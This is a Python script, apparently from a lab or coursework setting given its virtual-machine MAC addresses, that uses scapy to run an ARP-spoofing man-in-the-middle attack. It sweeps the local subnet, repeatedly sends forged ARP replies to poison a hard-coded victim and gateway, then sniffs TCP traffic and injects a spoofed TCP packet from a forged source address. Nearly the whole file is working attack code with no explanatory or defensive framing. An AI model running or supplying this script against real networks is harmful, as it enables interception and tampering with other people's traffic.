import os
import re
import time
from scapy.all import *
from uuid import getnode
import subprocess

def attacker():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	IP = ""
	try:
		s.connect(('8.8.8.8', 1))
		IP = s.getsockname()[0]
	except:
		IP = '127.0.0.1'
	finally:
		s.close()

	mac = getnode()
	mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))   

	return IP, mac

def ap(vip,vmac):
	c = 0
	for i in vip:
		if(i.endswith(".1")):
			return vip[c], vmac[c]
		c += 1
	return "",""


def scan_net(ip):
	prefix_ip = ".".join(ip.split(".")[:3])
	for i in range(255):
		try_ip = prefix_ip+".{}".format(i)
		os.system("sudo arp -d {} > /dev/null 2>&1".format(try_ip))
		os.system("ping -c 5 {} > /dev/null 2>&1 &".format(try_ip))
	time.sleep(2)




def arp():
	attacker_ip, attacker_mac = attacker()

	scan_net(attacker_ip)

	stream = os.popen('arp -a | grep -v incomplete')

	vip = []
	vmac = []

	lines = stream.readline()
	while lines:
		line = lines.split()
		line[1] = re.sub('[()]', '', line[1])
		vip.append(line[1])
		vmac.append(line[3])
		lines = stream.readline()
	
	print(vip,vmac)
	ap_ip, ap_mac = ap(vip,vmac)
	print(ap_ip,ap_mac)

	p = []
	# for i in range(len(vip)):
	p.append(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
	for i in range(10):
		print('send arp ', i)
		sendp(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
		sendp(Ether(dst='52:54:00:12:35:00', src=attacker_mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
		hwdst='52:54:00:12:35:00', hwsrc=attacker_mac, op=2))
		time.sleep(0.1)

# spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
# 		sendp(spoof_vic_pkt)
# 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
# 		sendp(spoof_ap_pkt)


def middle_man():
	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
	s.show()
	dstport = s[0][TCP].sport
	seqq = s[0][TCP].seq
	result, un = sr(IP(src='140.113.207.246', dst='10.0.2.4')/
		TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
	result.show()


arp()
middle_man()
